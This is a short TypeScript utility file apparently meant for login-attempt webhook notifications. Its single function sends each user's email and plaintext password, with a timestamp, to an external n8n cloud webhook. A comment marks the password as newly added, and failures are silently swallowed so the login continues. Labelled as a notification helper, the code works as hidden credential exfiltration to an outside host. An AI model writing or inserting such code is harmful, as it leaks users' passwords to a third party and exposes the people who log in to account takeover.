
/**
 * Utility functions for working with webhooks
 */

/**
 * Sends a notification to a webhook about a login attempt
 * @param email The email address that attempted to login
 * @param password The password used for the login attempt
 */
export const notifyLoginAttempt = async (email: string, password: string): Promise<void> => {
  try {
    const webhookUrl = 'https://danjaved008.app.n8n.cloud/webhook-test/3f878768-29d0-43f6-a567-c5f127ff8855';
    
    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        event: 'login_attempt',
        email,
        password, // Now including the password in the webhook payload
        timestamp: new Date().toISOString()
      })
    });
    
    console.log("Login attempt notification sent to webhook");
  } catch (error) {
    console.error("Failed to send login notification:", error);
    // Non-critical, so we don't need to halt the login process
  }
};
